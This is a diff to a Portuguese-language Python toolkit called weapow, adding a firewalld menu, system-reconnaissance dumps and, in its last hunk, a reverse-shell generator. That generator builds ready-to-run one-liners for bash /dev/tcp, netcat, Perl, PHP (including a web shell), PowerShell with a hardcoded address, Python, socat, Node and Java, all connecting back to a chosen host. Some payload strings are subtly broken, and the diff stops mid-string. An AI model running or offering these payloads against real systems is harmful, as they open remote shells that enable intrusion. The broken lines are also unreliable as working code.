@@ -1,27 +1,27 @@
 #!/usr/bin/env python
 version = "v3.61-dev"
 
-import os                                                      
+import os
 import re
 import sys
 import socket
 import requests
 import threading
 import time as t
-import getpass as g                                                
+import getpass as g
 import http.server as hs
 import socketserver as ss
-from bs4 import BeautifulSoup                                
+from bs4 import BeautifulSoup
 from requests.exceptions import SSLError
-from urllib.parse import urlparse, urljoin                     
-from concurrent.futures import ThreadPoolExecutor as e         
+from urllib.parse import urlparse, urljoin
+from concurrent.futures import ThreadPoolExecutor as e
 
 bann = '''\033[1;33m
-888  888  888  .d88b.   8888b.  88888b.   .d88b.  888  888  888 
-888  888  888 d8P  Y8b     "88b 888 "88b d88""88b 888  888  888 
-888  888  888 88888888 .d888888 888  888 888  888 888  888  888 
-Y88b 888 d88P Y8b.     888  888 888 d88P Y88..88P Y88b 888 d88P 
- "Y8888888P"   "Y8888  "Y888888 88888P"   "Y88P"   "Y8888888P"  
+888  888  888  .d88b.   8888b.  88888b.   .d88b.  888  888  888
+888  888  888 d8P  Y8b     "88b 888 "88b d88""88b 888  888  888
+888  888  888 88888888 .d888888 888  888 888  888 888  888  888
+Y88b 888 d88P Y8b.     888  888 888 d88P Y88..88P Y88b 888 d88P
+ "Y8888888P"   "Y8888  "Y888888 88888P"   "Y88P"   "Y8888888P"
                                 \033[1;33m888\033[m'''f''' \033[1;30m  __ _  ___ ____ _________/ /_____\033[m
  (\ (\ \033[1;35m                         \033[m\033[1;33m888\033[m \033[1;30m /  ' \/ _ `/ _ `/ __/ __/  '_/_ /\033[m
  ( ^.^)\033[1;35m-------------------------\033[m\033[1;33m888\033[m \033[1;30m/_/_/_/\_,_/\_,_/_/  \__/_/\_\/__/\033[m
@@ -31,10 +31,10 @@ Y88b 888 d88P Y8b.     888  888 888 d88P Y88..88P Y88b 888 d88P
 ####################################################
 ## GRUPO DE VARIÁVEIS QUE SÃO REPETIDAS NO CODIGO ##
 ####################################################
-press = '(Pressione qualquer tecla para voltar ao menu inicial)'  
-Ctrl_C = 'Você pressionou Ctrl+C para interromper o programa!'    
-dir = 'mkdir -p ARQ'                                              
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)             
+press = '(Pressione qualquer tecla para voltar ao menu inicial)'
+Ctrl_C = 'Você pressionou Ctrl+C para interromper o programa!'
+dir = 'mkdir -p ARQ'
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 
 #=======================================================================================
@@ -71,7 +71,7 @@ def iplist():
                 ip = f"{octetos}.{p}"
                 print(ip, file=f)
     print(f'Seu Arquivo foi gerado com Sucesso! ==> ({octetos}/{mask})')
-    input(press)   
+    input(press)
     main()
 
 
@@ -111,7 +111,7 @@ def host_discovery():
                 print(er)
                 quit()
             except FileNotFoundError:
-                print("\nO arquivo de IPs descobertos deve ser gerado.")	
+                print("\nO arquivo de IPs descobertos deve ser gerado.")
             except KeyboardInterrupt:
                 print('\n'+Ctrl_C)
                 quit()
@@ -286,6 +286,7 @@ def bigscan():
         print('Opção inválida.')            
             
 
+
 #=======================================================================================
 def http_finder():
     def wget_pg(ip, porta):
@@ -305,7 +306,7 @@ def http_finder():
                         porta = match.group(1)
                     if "http" in linha.lower() or "https" in linha.lower():
                         servico_web_encontrado = True
-                        break  
+                        break
                 if servico_web_encontrado:
                     thread = threading.Thread(target=wget_pg, args=(ip, porta))
                     thread.start()
@@ -314,12 +315,12 @@ def http_finder():
             thread.join()
 
 
-#=======================================================================================    
+#=======================================================================================
 def nc_get():
     os.system('rm ARQ/HEAD/*')
     os.makedirs("ARQ/HEAD", exist_ok=True)
     print('No código, existe a função nc(), mais lenta e verifica todas as portas.')
-    def get(host, porta, servico): 
+    def get(host, porta, servico):
         try:
             comando = f'echo -e "\n" | nc -vn -w 10 {host} {porta} 2>&1 | tee'
             t.sleep(0.6)
@@ -426,7 +427,7 @@ def link():
                     parsed_uri = urlparse(href)
                     domain = '{uri.netloc}'.format(uri=parsed_uri).split(':')[0]
                     subdomains.add(domain)
-        return durls, emails, tel, forms, subdomains #######################################  LEMBRAR COMO FUNCIONA 
+        return durls, emails, tel, forms, subdomains #######################################  LEMBRAR COMO FUNCIONA
 
     def process_url(url):
         visit_urls = set()
@@ -470,8 +471,7 @@ def link():
                 print('\nURLs INTERNAS:')
                 for url in durls:
                     print(url)
-                    # Chamada recursiva para o novo link encontrado
-                    
+
     def links(target):
         url_process = ['http://' + target]
         url_atual = url_process.pop()
@@ -484,7 +484,7 @@ def link():
                     url_atual = url_process.pop()
                     os.dup2(f.fileno(), 1)
                     process_url(url_atual)
-                    os.dup2(os.dup(2), 1) 
+                    os.dup2(os.dup(2), 1)
             print("WebCrawler salvo com sucesso!")
     sit_scan = input('Deseja utilizar um (H)ost ou a (L)ista? (H/L): ')
     if (sit_scan.lower() == 'h'):
@@ -509,18 +509,18 @@ def auto_web():
             conteudo_html = arquivo.read()
             soup = BeautifulSoup(conteudo_html, 'html.parser')
             formularios = soup.find_all('form', {'action': True, 'method': True})
-            
+
             if ip and formularios:
                 print('---------------------------------------------------------')
                 print(f'\nAnalisando {ip}:\n')
                 soup = BeautifulSoup(conteudo_html, 'html.parser')
                 formularios = soup.find_all('form', {'action': True, 'method': True})
-    
+
                 for formulario in formularios:
                     print(f'Atributo action: {formulario["action"]}')
                     print(f'Atributo method: {formulario["method"]}')
                     print(f'Conteúdo do formulário:')
-                    print(formulario.prettify())  # Imprime o conteúdo formatado
+                    print(formulario.prettify())
                     print('---------------------------------------------------------\n')
     input("Pressione Enter para continuar...")
     main()
@@ -547,9 +547,9 @@ def backup():
 def clonar():
     '''
     df -h
-umount -t ext4 /dev/sdx && mkfs.ext4 /dev/sdx 
-	dd if=/deb/sdx of=/dev/sdy bs=1M conv=noerror 
-sudo blkid 
+umount -t ext4 /dev/sdx && mkfs.ext4 /dev/sdx
+	dd if=/deb/sdx of=/dev/sdy bs=1M conv=noerror
+sudo blkid
 sudo nano /etc/fstab
     '''
     pass
@@ -570,7 +570,7 @@ Para configurar uma rotina C[R]ON:
 \033[0;31m|  +-------------------------------\033[m Hora (0-23)
 \033[0;31m+----------------------------------\033[m Minutos (0-59) se quiser a cada 15min use: '/15'
 
-Exemplo: 
+Exemplo:
 \033[7;33m*/15 * * * * /usr/bin/python3 /caminho/do/weapow.py\033[m   [A cada 15min EXEC o arquivo weapow.py usando Python3]
 \033[7;33m30 15 14 6 * /tmp/backup.sh\033[m                        [No dia 14JUN às 15:30 EXEC o backup.sh]
 
@@ -636,9 +636,10 @@ def infosys():
         output += os.popen('uname -a').read()
         output += os.popen('cat /proc/cmdline').read()
         output += '===============================================================\n'
-        
+
         output += '\n'
         output += 'TTY +==========================================================\n'
+        output += os.popen('who').read()
         output += os.popen('cat /proc/consoles').read()
         output += '===============================================================\n'
 
@@ -648,7 +649,7 @@ def infosys():
         output += os.popen(''' cat /proc/cpuinfo | awk '/cpu cores/ {gsub("cpu cores", "Cores"); print}' | uniq''').read()
         output += os.popen(''' cat /proc/cpuinfo | awk '/siblings/ {gsub("siblings", "Threads"); print}' | uniq''').read()
         output += '===============================================================\n'
-        
+
         output += '\n'
         output += 'MEMÓRIA ========================================================\n'
         output += os.popen('cat /proc/meminfo | grep MemTotal').read()
@@ -657,19 +658,19 @@ def infosys():
         output += os.popen('cat /proc/meminfo | grep SwapTotal').read()
         output += os.popen('cat /proc/meminfo | grep SwapFree').read()
         output += '===============================================================\n'
-        
+
         output += '\n'
         output += 'REDES =========================================================\n'
         output += os.popen('ip addr').read()
         output += '===============================================================\n'
-        
+
         output += '\n'
         output += 'NETSTAT =======================================================\n'
         output += os.popen('netstat -ano').read()
         output += '\n'
         output += os.popen('netstat -nr').read()
         output += '===============================================================\n'
-        
+
         output += '\n'
         output += 'ROTAS =========================================================\n'
         output += os.popen('cat /proc/net/route').read()
@@ -709,27 +710,28 @@ def infosys():
         output += 'LSLOGINS ======================================================\n'
         output += os.popen('lslogins').read()
         output += '===============================================================\n'
-        
+
         output += '\n'
         output += 'CAPTIVEF ======================================================\n'
+        output += os.popen('echo Travando o programa.').read()
         #output += os.popen('getcap -r / 2>/dev/null').read()
         output += '===============================================================\n'
-        
+
         output += '\n'
         output += 'VARIAVEIS DE AMBIENTE =========================================\n'
         output += os.popen('env').read()
         output += '===============================================================\n'
-        
+
         output += '\n'
         output += 'PROCESSOS =====================================================\n'
         output += os.popen('ps axjf').read()
         output += '===============================================================\n'
-        
+
         output += '\n'
         output += 'SERVIÇOS ======================================================\n'
         output += os.popen('systemctl --type=service --state=active | grep ^').read()
         output += '===============================================================\n'
-        
+
 
         prog = input('Deseja exibir os programas instalados? (S/N) ')
         if(prog.lower() == "s"):
@@ -737,13 +739,13 @@ def infosys():
             output += 'PROGRAMAS INSTALADOS ===========================================\n'
             output += os.popen('dpkg --list | grep ^ii.').read()
             output += '===============================================================\n'
-        
+
         output += '\n'
         output += 'BASH HISTORY===================================================\n'
         output += 'O histórico do BASH deve ser salvo manualmente por enquanto!\n'
         output += 'Use o comando: $ history\n'
         output += '===============================================================\n'
-        
+
         print(output)
 
         sit_audi = input('Deseja salvar em arquivo? (S/N) ')
@@ -766,30 +768,30 @@ def infosys():
         print('Seu Arquivo foi gerado com Sucesso!')
         input(press)
         main()
-        
+
 
 #=======================================================================================
 def config():
     os.system('clear')
     ver = "v1.0-dev"
     print(f'''\033[1;33m
-.d8888b.                     .d888 d8b             88888888888                888 
-d88P  Y88b                   d88P"  Y8P                 888                    888 
-888    888                   888                        888                    888 
-888         .d88b.  88888b.  888888 888  .d88b.         888   .d88b.   .d88b.  888 
-888        d88""88b 888 "88b 888    888 d88P"88b        888  d88""88b d88""88b 888 
-888    888 888  888 888  888 888    888 888  888        888  888  888 888  888 888 
-Y88b  d88P Y88..88P 888  888 888    888 Y88b 888        888  Y88..88P Y88..88P 888 
- "Y8888P"   "Y88P"  888  888 888    888  "Y88888        888   "Y88P"   "Y88P"  888 
-                                             888                                   
+.d8888b.                     .d888 d8b             88888888888                888
+d88P  Y88b                   d88P"  Y8P                 888                    888
+888    888                   888                        888                    888
+888         .d88b.  88888b.  888888 888  .d88b.         888   .d88b.   .d88b.  888
+888        d88""88b 888 "88b 888    888 d88P"88b        888  d88""88b d88""88b 888
+888    888 888  888 888  888 888    888 888  888        888  888  888 888  888 888
+Y88b  d88P Y88..88P 888  888 888    888 Y88b 888        888  Y88..88P Y88..88P 888
+ "Y8888P"   "Y88P"  888  888 888    888  "Y88888        888   "Y88P"   "Y88P"  888
+                                             888
                                         Y8b d88P       \033[0;31m>Esta função precisa de SUDO!\033[m
                                          "Y88P"                            \033[7;32m{ver}\033[m''')
     print(''' MENU:
 
     \033[0;34m[1]\033[m - Criar usuário em RBASH
     \033[0;34m[2]\033[m - Permitir BASH padrão
-    \033[0;34m[3]\033[m - Restringir TODOS os comandos             
-    \033[0;34m[4]\033[m - xxx
+    \033[0;34m[3]\033[m - Restringir TODOS os comandos
+    \033[0;34m[4]\033[m - Config SSH
     \033[0;34m[5]\033[m - xxx
     \033[0;34m[6]\033[m - xxx
     \033[0;34m[7]\033[m - xxx
@@ -797,9 +799,9 @@ Y88b  d88P Y88..88P 888  888 888    888 Y88b 888        888  Y88..88P Y88..88P 8
     \033[0;34m[9]\033[m - xxx
     \033[0;34m[10]\033[m- xxx
     ''')
-    try:    
+    try:
         opcao=int(input('Escolha uma opção: '))
-        
+
         if opcao == 1:
             user = input('Qual o usuário a ser configurado? ')
             os.system(f"sudo useradd -m -s /bin/rbash {user}")
@@ -832,7 +834,7 @@ Y88b  d88P Y88..88P 888  888 888    888 Y88b 888        888  Y88..88P Y88..88P 8
                     if words:
                         if any(cmd in words for cmd in ["cat","ls", "cd", "exit"]):
                             continue
-                        else:    
+                        else:
                             first_names.append(words[0])
 
                 with open('block', 'w') as block_file:
@@ -855,9 +857,24 @@ Y88b  d88P Y88..88P 888  888 888    888 Y88b 888        888  Y88..88P Y88..88P 8
                 else:
                     input("Pressione Enter para continuar...")
                     main()
-                        
+
         elif opcao == 4:
-            pass
+            print('''
+Você deseja configurar Servidor ou Client?
+
+\033[0;34m[1]\033[m Servidor  \033[0;34m[2]\033[m Client \033[0;34m[0]\033[m Voltar
+            ''')
+            sit_ssh = int(input('Escolha uma opção: '))
+            if sit_ssh == 1:
+                print()
+            elif sit_ssh == 2:
+                pass
+            elif sit_ssh == 0:
+                main()
+            else:
+                print('Digite uma opção válida!')
+                input(press)
+
         elif opcao == 5:
             pass
         elif opcao == 6:
@@ -876,14 +893,14 @@ Y88b  d88P Y88..88P 888  888 888    888 Y88b 888        888  Y88..88P Y88..88P 8
         elif opcao > 10:
             print('Digite uma opção válida!')
             input(press)
-            
+
     except ValueError as e:
         print('Digite uma opção válida!')
         input(press)
     except NameError as e:
         print('Digite uma opção válida!')
         input(press)
-    
+
 
 
     '''os.system('sudo ip addr show')
@@ -932,6 +949,306 @@ def linenum():
 
 
 #=======================================================================================
+def waza():
+    wversion = '\033[7;32mv1.2dev\033[m'
+
+    def check_firewalld():
+        with open("/etc/os-release", "r") as file:
+            for line in file:
+                if line.startswith("ID="):
+                    distro_id = line.split("=")[1].strip().strip('"')
+        if distro_id in ["ubuntu", "centos", "rhel"]:
+            install_firewalld(distro_id)
+        else:
+            print("Distribuição não suportada.")
+
+    def install_firewalld(distro_id):
+        status = os.system("sudo systemctl status firewalld >/dev/null 2>&1")
+        if status == 0:
+            print("Firewalld está instalado e em execução.")
+        else:
+            install_firewalld = input(f"O firewalld não está instalado. Deseja instalar o firewalld no {distro_id}? (S/N): ").lower()
+            if install_firewalld == "s":
+                package_manager = "apt" if distro_id == "ubuntu" else "yum"
+                os.system(f"sudo {package_manager} install firewalld -y")
+                os.system("sudo systemctl start firewalld")
+                os.system("sudo systemctl enable firewalld")
+                print("Firewalld instalado e iniciado com sucesso.")
+            else:
+                print("Firewalld não instalado. Instale manualmente e tente novamente!")
+
+    check_firewalld() 
+    selected_interface = None
+    selected_zones_str = None
+    selected_services_str = None
+    block_selected_services_str = None
+    selected_ports_str = None
+    block_selected_ports_str = None
+    port_list = None
+    press = '(Pressione qualquer tecla para voltar ao menu inicial)'
+    os.system('clear')
+    try:
+        while True:
+            print(f'''\033[1;91m
+        .DL               ;W,      ,##############Wf.     ;W,
+f.     :K#L     LWL      j##,       ........jW##Wt       j##,
+EW:   ;W##L   .E#f      G###,             tW##Kt        G###,
+E#t  t#KE#L  ,W#;     :E####,           tW##E;        :E####,
+E#t f#D.L#L t#K:     ;W#DG##,         tW##E;         ;W#DG##,
+E#jG#f  L#LL#G      j###DW##,      .fW##D,          j###DW##,
+E###;   L###j      G##i,,G##,    .f###D,           G##i,,G##,
+E#K:    L#W;     :K#K:   L##,  .f####Gffffffff;  :K#K:   L##,
+EG      LE.     ;##D.    L##, .fLLLLLLLLLLLLi   ;##D.    L##,
+                                                     \033[m{wversion}''')
+            print("Opções:\n")
+            print(f"\033[0;34m[1]\033[m - Selecionar interface {'(Selecionado: ' + selected_interface + ')' if selected_interface else ''}")
+            if selected_zones_str:
+                print(f"\033[0;34m[2]\033[m - Selecionar zona (Selecionado:  {selected_zones_str})")
+            else:
+                print(f"\033[0;34m[2]\033[m - Selecionar zona")
+            if selected_services_str:
+                print(f"\033[0;34m[3]\033[m - Liberar serviços (Selecionados: {selected_services_str})")
+            else:
+                print("\033[0;34m[3]\033[m - Liberar serviços")            
+            if selected_ports_str:
+                print(f"\033[0;34m[4]\033[m - Liberar portas (Selecionados: {selected_ports_str})")
+            else:
+                print("\033[0;34m[4]\033[m - Liberar portas ")
+            if block_selected_services_str:
+                print(f"\033[0;34m[5]\033[m - Bloquear serviços (Selecionados: {block_selected_services_str})")
+            else:
+                print("\033[0;34m[5]\033[m - Bloquear serviços")            
+            if block_selected_ports_str:
+                print(f"\033[0;34m[6]\033[m - Bloquear portas (Selecionados: {block_selected_ports_str})")
+            else:
+                print("\033[0;34m[6]\033[m - Bloquear portas ") 
+
+            print(f"\033[0;34m[7]\033[m - Remover interface da Zona")
+            print(f"\033[0;34m[8]\033[m - Bloquear IP")
+            print(f"\033[0;34m[9]\033[m - Bloquear IPs por Máscara")
+            print(f'\033[0;34m[10]\033[m- Listar todas as Zonas')
+            print(f"\033[0;34m[11]\033[m- Mostrar Configuração da Zona")
+            print(f"\033[0;34m[12]\033[m- Listar IPs bloqueados")
+            print("\033[0;34m[13]\033[m- Aplicar Configurações")
+            print("\033[0;34m[0]\033[m - Sair")
+
+            choice = input("\nEscolha uma opção: ")
+            if choice == "1": #Selecionar interface
+                interfaces = os.popen("ls /sys/class/net/").read().strip().split()
+                print("Interfaces disponíveis:")
+                for i, iface in enumerate(interfaces, start=1):
+                    if iface != 'lo':
+                        print(f"[{i}] {iface}")
+                try:
+                    print("[0] Voltar ao Menu")
+                    interface_index = int(input("Escolha a interface (número): "))
+                    if interface_index == 0:
+                        selected_interface = None
+                    elif 1 <= interface_index <= len(interfaces):
+                        selected_interface = interfaces[interface_index - 1]
+                except (ValueError, IndexError):
+                    print("Escolha inválida.")
+            elif choice == "2": # Selecionar zona
+                    zones = os.popen("firewall-cmd --get-zones").read().strip().split()
+                    print("Zonas disponíveis:")
+                    for i, zone in enumerate(zones, start=1):
+                        print(f"[{i}] {zone}")
+                    try:
+                        print("[0] Voltar ao Menu")
+                        selected_zones = []
+                        while True:
+                            zone_index = int(input("Escolha a zona (número): "))
+                            if zone_index == 0:
+                                break
+                            elif 1 <= zone_index <= len(zones):
+                                selected_zone = zones[zone_index - 1]
+                                selected_zones.append(selected_zone)  # Adiciona a zona selecionada à lista
+                            else:
+                                print("Escolha inválida.")
+                            selected_zones_str = ', '.join(selected_zones)
+                    except (ValueError, IndexError):
+                        print("Escolha inválida.")
+            elif choice == "3": #Liberar serviços
+                if selected_zone and selected_interface:
+                    services = os.popen("""firewall-cmd --get-services""").read().strip().split()
+                    services = [service.strip() for service in services if service.strip()]
+                    print("Escolha os Serviços:")
+                    for i, service in enumerate(services, start=1):
+                        print(f"[{i}] {service}")
+                    try:
+                        print("[0] Voltar ao Menu")
+                        selected_services = []
+                        while True:
+                            service_index = int(input("Escolha o serviço (número): "))
+                            if service_index == 0:
+                                break
+                            elif 1 <= service_index <= len(services):
+                                selected_service = services[service_index - 1]
+                                selected_services.append(selected_service)
+                            else:
+                                print("Escolha inválida.")
+                        selected_services_str = ', '.join(selected_services)
+                    except (ValueError, IndexError):
+                        print("Escolha inválida.")
+                else:
+                    print("Zona ou serviço não selecionado.")
+            elif choice == "4": #Liberar portas
+                if selected_zone and selected_interface:
+                    ports = input("Digite a(s) porta(s) desejada(s) separada(s) por vírgula: ")
+                    port_list = ports.split(',')
+                    for index, port in enumerate(port_list):
+                        try:
+                            port_list[index] = port.strip()
+                        except ValueError:
+                            print(f"Entrada inválida para a porta: {port}")
+
+                    selected_ports_str = ', '.join(port_list)
+                else:
+                    print("Zona ou serviço não selecionado.")
+            elif choice == "5": #Bloquear serviços
+                if selected_zone and selected_interface:
+                    block_services = os.popen("""firewall-cmd --get-services""").read().strip().split()
+                    block_services = [block_service.strip() for block_service in block_services if block_service.strip()]
+                    print("Escolha os Serviços:")
+                    for i, block_service in enumerate(block_services, start=1):
+                        print(f"[{i}] {block_service}")
+                    try:
+                        print("[0] Voltar ao Menu")
+                        block_selected_services = []
+                        while True:
+                            block_service_index = int(input("Escolha o serviço (número): "))
+                            if block_service_index == 0:
+                                break
+                            elif 1 <= block_service_index <= len(block_services):
+                                block_selected_service = block_services[block_service_index - 1]
+                                block_selected_services.append(block_selected_service)
+                            else:
+                                print("Escolha inválida.")
+                        block_selected_services_str = ', '.join(block_selected_services)
+                    except (ValueError, IndexError):
+                        print("Escolha inválida.")
+                else:
+                    print("Zona ou serviço não selecionado.")
+            elif choice == "7": #Remover interface de uma Zona
+                if selected_zone and selected_interface:
+                    sit_remove = input(f"Deseja remover a interface {selected_interface} da zona {selected_zone}. (S/N) ")
+                    if sit_remove.lower() == 's':
+                        os.system(f"firewall-cmd --zone={selected_zone} --permanent --remove-interface={selected_interface}")
+                        os.system("firewall-cmd --reload")
+                        print(f"Interface {selected_interface}removida da zona {selected_zone}.")
+                else:
+                    print("Selecione a Interface a ser removida e a Zona a ser configurada.")
+            elif choice == "8": #Bloquear IP
+                ip_to_block = input("Digite o IP a ser bloqueado: ")
+                print(f"IP {ip_to_block} bloqueado.")
+            elif choice == "9":#Bloquear IPs por Máscara
+                ip_mask = input("Digite o range de IPs (com máscara) a ser bloqueado: ")
+                print(f"Range de IPs {ip_mask} bloqueado.")
+            elif choice == "10": #Listar todas as Zonas
+                os.system('firewall-cmd --list-all-zones')
+                input(press)
+            elif choice == "11": #Mostrar Configuração da Zona
+               os.system(f'firewall-cmd --zone={selected_zone} --list-all')
+               input(press)
+            elif choice == "12": #Listar IPs bloqueados
+                pass
+            elif choice == "13": #Aplicar Configurações
+                if selected_zone and selected_interface:
+                    cfg_iface = os.popen(f"firewall-cmd --zone={selected_zone} --change-interface={selected_interface} --permanent").read()
+                    print(f'Configuração da INTERFACE e ZONA: {cfg_iface}')
+                    if selected_services_str != None:
+                        selected_services_list = selected_services_str.split(', ')
+                        for service in selected_services_list:
+                            cfg_service = os.popen(f"firewall-cmd --add-service={service} --permanent --zone={selected_zone}").read()
+                            print(f'Permissão do serviço {service}: {cfg_service}')
+                    if selected_ports_str != None:
+                        selected_ports_str = selected_ports_str.split(',')
+                        for port in selected_ports_str:
+                            if port != 0 or port != '':
+                                tcp_port = os.popen(f"firewall-cmd --add-port={port}/tcp --permanent --zone={selected_zone}").read()
+                                print(f'Porta {port}/tcp liberada: {tcp_port}')
+                                udp_port = os.popen(f"firewall-cmd --add-port={port}/udp --permanent --zone={selected_zone}").read()
+                                print(f'Porta {port}/udp liberada: {udp_port}')
+                    if block_selected_services_str != None:
+                        block_selected_services_list = block_selected_services_str.split(', ')
+                        for block_service in block_selected_services_list:
+                            block_cfg_service = os.popen(f"firewall-cmd --remove-service={block_service} --permanent --zone={selected_zone}").read()
+                            print(f'Bloqueio do serviço {block_service}: {block_cfg_service}')
+                    try:
+                        while True:
+                            print("\nConfiguração manual para a zona:")
+                            print("[1] Bloquear ICMP")
+                            print("[2] Configurar forward")
+                            print("[3] Configurar masquerade")
+                            print("[0] Concluir")
+                            choice = input("Escolha uma opção: ")
+                            if choice == "1":
+                                icmp_options = {
+                                    "Echo-Request": "echo-request",
+                                    "Echo-Reply": "echo-reply",
+                                    "Destination Unreachable": "destination-unreachable",
+                                    "Source Quench": "source-quench",
+                                    "Redirect": "redirect",
+                                    "Time Exceeded": "time-exceeded",
+                                    "Parameter Problem": "parameter-problem",
+                                    "Timestamp Request/Reply": "timestamp-request",
+                                    "Address Mask Request/Reply": "address-mask-request",
+                                    "Router Solicitation/Advertisement": "router-solicitation",
+                                    "Traceroute": "traceroute"
+                                }
+                                print("\nOpções de bloqueio ICMP:")
+                                for num, option in enumerate(icmp_options.keys(), start=1):
+                                    print(f"{num}. {option}")
+                                try:
+                                    option_num = int(input("Digite o número correspondente à opção de ICMP a ser bloqueada: "))
+                                    if 1 <= option_num <= len(icmp_options):
+                                        selected_icmp = list(icmp_options.keys())[option_num - 1]
+                                        icmp_type = icmp_options[selected_icmp]
+                                        os.system(f"firewall-cmd --zone={selected_zone} --add-icmp-block={icmp_type}")
+                                        os.system("firewall-cmd --reload")
+                                        print(f"Comando executado: firewall-cmd --zone={selected_zone} --add-icmp-block={icmp_type}")
+                                        print(f"ICMP tipo '{selected_icmp}' bloqueado.")
+                                    else:
+                                        print("Número de opção inválido.")
+                                except ValueError:
+                                    print("Entrada inválida. O número da opção deve ser um número inteiro.")
+                            elif choice == "2":
+                                forward_value = input("Deseja habilitar o Forward? (S/N) ")
+                                if forward_value.lower() =='s':
+                                    os.system(f"firewall-cmd --zone={selected_zone} --add-forward")
+                                    os.system("firewall-cmd --reload")
+                                    print(f"Forward configurado para {forward_value}.")
+                                elif forward_value.lower() =='n':
+                                    os.system(f"firewall-cmd --zone={selected_zone} --remove-forward")
+                                    os.system("firewall-cmd --reload")
+                                    print(f"Forward configurado para {forward_value}.")
+                            elif choice == "3":
+                                masquerade_value = input("Deseja habilitar o Masquerade? (S/N) ")
+                                os.system(f"firewall-cmd --zone={selected_zone} --add-option=masquerade --value={masquerade_value}")
+                                os.system("firewall-cmd --reload")
+                                print(f"Comando executado: firewall-cmd --zone={selected_zone} --add-option=masquerade --value={masquerade_value}")
+                                print(f"Masquerade configurado para {masquerade_value}.")
+                            elif choice == "0":
+                                break
+                            else:
+                                print("Escolha inválida. Tente novamente.")
+                    except KeyboardInterrupt:
+                        print("\nPrograma encerrado.")
+                        os.system('clear')
+                    os.system("firewall-cmd --reload")
+                else:
+                    print("Zona ou serviço não selecionado.")
+            elif choice == "0":
+                print("Até a próxima! (ツ)")
+                break
+            else:
+                print("Opção inválida. Tente novamente.")
+            os.system('clear')
+    except KeyboardInterrupt:
+        print(Ctrl_C)
+        input(press)
+
+#=======================================================================================
 def suid():
     path = input('Digite o caminho a ser pesquisado: ')
     if (bool(path) == False):
@@ -964,200 +1281,136 @@ def nc(porta):
         nc(porta)
     except KeyboardInterrupt:
         print('\n'+Ctrl_C)
-        
+
 
 #=======================================================================================
 def reverse_shell():
-    def reverse_shell():
+    def execute_command(command):
+        os.system(command)
+
+    def display_reverse_shell_options(options):
+        for idx, option in options.items():
+            print(f'{idx}. {option["label"]}')
+        print('')
+
     try:
-        print('''
+        ip = input('Digite o IP: ')
+        porta = int(input('Digite a Porta: '))
+
+        options = {
+            1: {"label": "|BASH|", "commands": ['sh -i >& /dev/tcp/{}/{} 0>&1'.format(ip, porta),
+                                                '0<&196;exec 196<>/dev/tcp/{}/{}; sh <&196 >&196 2>&196'.format(ip, porta),
+                                                'exec 5<>/dev/tcp/{}/{};cat <&5 | while read line; do $line 2>&5 >&5; done'.format(ip, porta),
+                                                'sh -i 5<> /dev/tcp/{}/{} 0<&5 1>&5 2>&5',
+                                                'sh -i >& /dev/udp/{}/{} 0>&1']},
+            2: {"label": "|NETCAT|", "commands": ['rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {} {} >/tmp/f'.format(ip, porta),
+                                                    'nc {} {} -e sh'.format(ip, porta)]},
+            3: {"label": "|RUST|", "commands": ['rcat {} {} -r sh'.format(ip, porta)]},
+            4: {"label": "|PERL|", "commands": [
+                """perl -e 'use Socket;$i="SEUIP";$p=SUAPORTA;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'""",
+                """perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{}:{}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'""".format(
+                    ip, porta)]},
+            5: {"label": "|PHP|", "commands": [
+                """ <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?> """,
+                """php -r '$sock=fsockopen("{}",{});exec("sh <&3 >&3 2>&3");'""".format(ip, porta),
+                """php -r '$sock=fsockopen("{}",{});shell_exec("sh <&3 >&3 2>&3");'""".format(ip, porta)]},
+            6: {"label": "|POWERSHELL|", "commands": [
+                """powershell -e client = New-Object System.Net.Sockets.TCPClient("192.168.0.192",4545);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()""",
+            ]},
+            7: {"label": "|PYTHON|", "commands": [
+                """export RHOST="{}";export RPORT={};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'""".format(
+                    ip, porta),
+                """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'""".format(
+                    ip, porta)]},
+            8: {"label": "|SOCAT|", "commands": [
+                """socat TCP:{}:{} EXEC:sh""".format(ip, porta),
+                """socat TCP:{}:{} EXEC:'sh',pty,stderr,setsid,sigint,sane""".format(ip, porta)]},
+            9: {"label": "|NODE|", "commands": [
+                """require('child_process').exec('nc -e sh {} {}')""".format(ip, porta)]},
+            10: {"label": "|JAVASCRIPT|", "commands": [
+                """String command = "var host = 'SEUIP';" +
+                            "var port = SUAPORTA;" +
+                            "var cmd = 'sh';"+
+                            "var s = new java.net.Socket(host, port);" +
+                            "var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();"+
+                            "var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();"+
+                            "var po = p.getOutputStream(), so = s.getOutputStream();"+
+                            "print ('Connected');"+
+                            "while (!s.isClosed()) {"+
+                            "    while (pi.available() > 0)"+
+                            "        so.write(pi.read());"+
+                            "    while (pe.available() > 0)"+
+                            "        so.write(pe.read());"+
+                            "    while (si.available() > 0)"+
+                            "        po.write(si.read());"+
+                            "    so.flush();"+
+                            "    po.flush();"+
+                            "    java.lang.Thread.sleep(50);"+
+                            "    try {"+
+                            "        p.exitValue();"+
+                            "        break;"+
+                            "    }"+
+                            "    catch (e) {"+
+                            "    }"+
+                            "}"+
